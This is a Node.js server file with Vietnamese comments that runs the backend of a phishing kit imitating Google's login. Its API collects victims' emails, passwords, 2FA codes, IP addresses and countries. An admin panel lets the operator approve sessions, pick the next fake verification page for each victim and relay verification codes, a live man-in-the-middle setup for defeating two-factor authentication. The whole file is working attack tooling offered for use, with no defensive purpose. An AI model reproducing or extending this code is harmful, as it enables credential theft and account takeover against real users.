/**
 * Local all-in-one server
 * - Serves frontend  (google-login-clone) at  http://localhost:5000/
 * - Serves admin GUI (admin-gui)          at  http://localhost:5000/admin
 * - Exposes REST API                      at  http://localhost:5000/api/*
 *
 * In-memory store (mất khi restart). Thay bằng DB nếu cần persist.
 */

const http = require('http');
const fs = require('fs');
const path = require('path');
const url = require('url');

const PORT = 5000;
const ROOT = __dirname;
const FRONTEND_DIR = path.join(ROOT, 'google-login-clone');
const ADMIN_DIR = path.join(ROOT, 'admin-gui');

// --------------------------- Data store ---------------------------
/** @type {Array<any>} */
let requests = [];
let nextId = 1;

const PAGE_MAP = {
    'index.html': 'Login',
    'password.html': 'Password',
    'verify.html': 'Setup Code Phone',
    'verify-device.html': 'Setup Code Phone',
    'verify-notification.html': 'Notification',
    'verify-options.html': 'Notification',
};

function findByEmail(email) {
    if (!email) return null;
    for (let i = requests.length - 1; i >= 0; i--) {
        if (requests[i].email === email) return requests[i];
    }
    return null;
}
function findById(id) {
    return requests.find(r => String(r.id) === String(id)) || null;
}

// Đánh dấu user còn "sống" (trình duyệt vẫn mở trang, vẫn đang poll).
// Chỉ gọi từ các endpoint do CLIENT gọi (request / update-page /
// check-approval). KHÔNG gọi từ endpoint admin để không làm "vệt" keepalive
// giả khi user đã đóng tab.
function touchLastSeen(entry) {
    if (entry) entry.lastSeen = new Date().toISOString();
}

// --------------------------- HTTP helpers ---------------------------
const MIME = {
    '.html': 'text/html; charset=utf-8',
    '.js':   'text/javascript; charset=utf-8',
    '.css':  'text/css; charset=utf-8',
    '.json': 'application/json; charset=utf-8',
    '.png':  'image/png',
    '.jpg':  'image/jpeg',
    '.jpeg': 'image/jpeg',
    '.gif':  'image/gif',
    '.svg':  'image/svg+xml',
    '.ico':  'image/x-icon',
    '.woff': 'font/woff',
    '.woff2':'font/woff2',
};

function setCORS(res) {
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'GET,POST,PUT,DELETE,OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type,Authorization,apikey,Cache-Control');
    res.setHeader('Cache-Control', 'no-store');
}

function sendJSON(res, status, data) {
    res.writeHead(status, { 'Content-Type': 'application/json; charset=utf-8' });
    res.end(JSON.stringify(data));
}

function readBody(req) {
    return new Promise(resolve => {
        let buf = '';
        req.on('data', c => (buf += c));
        req.on('end', () => {
            if (!buf) return resolve({});
            try { resolve(JSON.parse(buf)); } catch { resolve({}); }
        });
    });
}

function serveFile(filePath, res) {
    fs.readFile(filePath, (err, content) => {
        if (err) {
            res.writeHead(404, { 'Content-Type': 'text/plain' });
            return res.end('Not found');
        }
        const ext = path.extname(filePath).toLowerCase();
        res.writeHead(200, { 'Content-Type': MIME[ext] || 'application/octet-stream' });
        res.end(content);
    });
}

// --------------------------- API handlers ---------------------------
async function handleApi(req, res, pathname, query) {
    // POST /api/request — frontend gửi email / password / twofa + geolocation (ip, country)
    if (req.method === 'POST' && pathname === '/api/request') {
        const body = await readBody(req);
        const {
            email = '', password = '', twofa = '',
            userAgent = '', currentPage = '', sessionId = '',
            ip = '', country = '', countryCode = '',
        } = body;
        if (!email) return sendJSON(res, 400, { error: 'email required' });

        // Fallback: nếu client không gửi ip (ipwho.is fail) → lấy từ socket.
        const clientIp = ip || (req.headers['x-forwarded-for'] || '').toString().split(',')[0].trim()
            || (req.socket && req.socket.remoteAddress) || '';

        let entry = findByEmail(email);
        if (!entry) {
            entry = {
                id: nextId++,
                email,
                sessionId: sessionId || '',
                password: '',
                twofa: '',
                verificationCode: '',
                pageStatus: 'Login',
                status: 'pending',
                nextPage: '',
                userAgent: '',
                ip: '',
                country: '',
                countryCode: '',
                tag: '',
                note: '',
                createdAt: new Date().toISOString(),
            };
            requests.push(entry);
        } else {
            // User đã chuyển sang trang mới — reset quyết định (status, nextPage)
            // để admin duyệt lại. verificationCode GIỮ NGUYÊN để trang
            // verify-notification có thể hiển thị mã mà admin đã nhập.
            entry.status = 'pending';
            entry.nextPage = '';
        }

        if (sessionId && !entry.sessionId) entry.sessionId = sessionId;
        if (password) entry.password = password;
        if (twofa)    entry.twofa    = twofa;
        if (userAgent) entry.userAgent = userAgent;
        if (currentPage && PAGE_MAP[currentPage]) entry.pageStatus = PAGE_MAP[currentPage];
        // Chỉ set geolocation lần đầu — giữ nguyên ở các request kế tiếp
        // (user thường không đổi IP giữa chừng trong 1 phiên).
        if (!entry.ip      && clientIp)   entry.ip          = clientIp;
        if (!entry.country && country)    entry.country     = country;
        if (!entry.countryCode && countryCode) entry.countryCode = countryCode;
        entry.createdAt = new Date().toISOString();
        touchLastSeen(entry);

        return sendJSON(res, 200, { ...entry, requestId: entry.id });
    }

    // POST /api/update-page — cập nhật trạng thái trang hiện tại
    if (req.method === 'POST' && pathname === '/api/update-page') {
        const body = await readBody(req);
        const { id, email, pageStatus, currentPage } = body;
        const entry = (id && findById(id)) || findByEmail(email);
        if (entry) {
            if (pageStatus) entry.pageStatus = pageStatus;
            else if (currentPage) entry.pageStatus = PAGE_MAP[currentPage] || currentPage;
            entry.createdAt = new Date().toISOString();
            touchLastSeen(entry);
        }
        return sendJSON(res, 200, { ok: true });
    }

    // GET /api/status/:id
    if (req.method === 'GET' && pathname.startsWith('/api/status/')) {
        const id = decodeURIComponent(pathname.split('/').pop());
        const entry = findById(id);
        touchLastSeen(entry);
        return sendJSON(res, 200, entry || { status: 'pending' });
    }

    // GET /api/check-approval?email=...
    if (req.method === 'GET' && pathname === '/api/check-approval') {
        const entry = findByEmail(query.email);
        touchLastSeen(entry);
        return sendJSON(res, 200, {
            status: entry ? entry.status : 'pending',
            verificationCode: entry ? entry.verificationCode : '',
            nextPage: entry ? (entry.nextPage || '') : '',
        });
    }

    // GET /api/pending — admin lấy toàn bộ danh sách
    if (req.method === 'GET' && pathname === '/api/pending') {
        return sendJSON(res, 200, requests);
    }

    // POST /api/approve — admin approve/deny + chỉ định nextPage
    //   body: { id?, email?, decision: 'approved'|'denied', nextPage?, verificationCode? }
    //   nextPage: 'password.html'|'verify-device.html'|'verify-notification.html'|
    //             'verify-options.html'|'verify.html'|'success'  (hoặc bỏ trống)
    if (req.method === 'POST' && pathname === '/api/approve') {
        const body = await readBody(req);
        const { id, email, decision, nextPage, verificationCode } = body;
        let entry = findById(id) || findByEmail(email);
        if (!entry) return sendJSON(res, 404, { error: 'not found', id, email });
        entry.status = decision === 'denied' ? 'denied' : 'approved';
        if (verificationCode) entry.verificationCode = verificationCode;
        entry.nextPage = nextPage || '';
        entry.createdAt = new Date().toISOString();
        return sendJSON(res, 200, { ok: true, entry });
    }

    // POST /api/set-verification-code — admin gán mã verify cho 1 email
    if (req.method === 'POST' && pathname === '/api/set-verification-code') {
        const body = await readBody(req);
        const { email, code } = body;
        const entry = findByEmail(email);
        if (!entry) return sendJSON(res, 404, { error: 'not found' });
        entry.verificationCode = code || '';
        entry.createdAt = new Date().toISOString();
        return sendJSON(res, 200, { ok: true });
    }

    // POST /api/delete — admin xóa 1 hoặc NHIỀU request
    //   body: { id }         — xóa đơn lẻ (backward compat)
    //   body: { ids: [...] } — xóa hàng loạt (bulk delete)
    if (req.method === 'POST' && pathname === '/api/delete') {
        const body = await readBody(req);
        const { id, ids } = body;
        const targetIds = Array.isArray(ids) && ids.length
            ? ids.map(String)
            : (id != null ? [String(id)] : []);
        if (!targetIds.length) return sendJSON(res, 400, { error: 'id or ids required' });
        const before = requests.length;
        requests = requests.filter(r => !targetIds.includes(String(r.id)));
        return sendJSON(res, 200, { ok: true, deleted: before - requests.length });
    }

    // POST /api/set-meta — admin set tag / note cho 1 request
    //   body: { id, tag?, note? }
    if (req.method === 'POST' && pathname === '/api/set-meta') {
        const body = await readBody(req);
        const { id, tag, note } = body;
        const entry = findById(id);
        if (!entry) return sendJSON(res, 404, { error: 'not found' });
        if (typeof tag  === 'string') entry.tag  = tag;
        if (typeof note === 'string') entry.note = note;
        return sendJSON(res, 200, { ok: true, entry });
    }

    // GET /api/verification-html/:email — tiện ích cho frontend legacy
    if (req.method === 'GET' && pathname.startsWith('/api/verification-html/')) {
        const email = decodeURIComponent(pathname.replace('/api/verification-html/', ''));
        const entry = findByEmail(email);
        const code = entry ? entry.verificationCode : '';
        return sendJSON(res, 200, { code, html: code ? `<div class="code">${code}</div>` : '' });
    }

    return sendJSON(res, 404, { error: 'API not found', pathname });
}

// --------------------------- Router ---------------------------
const server = http.createServer(async (req, res) => {
    setCORS(res);
    if (req.method === 'OPTIONS') { res.writeHead(204); return res.end(); }

    const parsed = url.parse(req.url, true);
    const pathname = decodeURIComponent(parsed.pathname || '/');

    // Log mọi request (trừ polling /api/pending để tránh spam)
    if (pathname !== '/api/pending' && !pathname.startsWith('/api/status/') && pathname !== '/api/check-approval') {
        console.log(`[${new Date().toISOString().substring(11,19)}] ${req.method} ${req.url}`);
    }

    try {
        // API
        if (pathname.startsWith('/api/')) {
            return await handleApi(req, res, pathname, parsed.query);
        }

        // Admin GUI
        if (pathname === '/admin' || pathname === '/admin/') {
            return serveFile(path.join(ADMIN_DIR, 'index.html'), res);
        }
        if (pathname.startsWith('/admin/')) {
            const rel = pathname.replace(/^\/admin\//, '');
            const safe = path.normalize(rel).replace(/^(\.\.[/\\])+/, '');
            return serveFile(path.join(ADMIN_DIR, safe), res);
        }

        // Frontend static
        let rel = pathname === '/' ? 'index.html' : pathname.slice(1);
        if (!path.extname(rel)) {
            const pages = ['index','password','verify','verify-device','verify-notification','verify-options','test'];
            if (pages.includes(rel)) rel += '.html';
        }
        const safe = path.normalize(rel).replace(/^(\.\.[/\\])+/, '');
        return serveFile(path.join(FRONTEND_DIR, safe), res);
    } catch (e) {
        console.error('[server error]', e);
        sendJSON(res, 500, { error: 'server error', message: String(e.message || e) });
    }
});

server.listen(PORT, () => {
    console.log('==============================================');
    console.log(`  Local server running at http://localhost:${PORT}`);
    console.log('----------------------------------------------');
    console.log(`  Frontend :  http://localhost:${PORT}/`);
    console.log(`  Admin    :  http://localhost:${PORT}/admin`);
    console.log(`  API base :  http://localhost:${PORT}/api`);
    console.log('==============================================');
    console.log('Press Ctrl+C to stop');
});
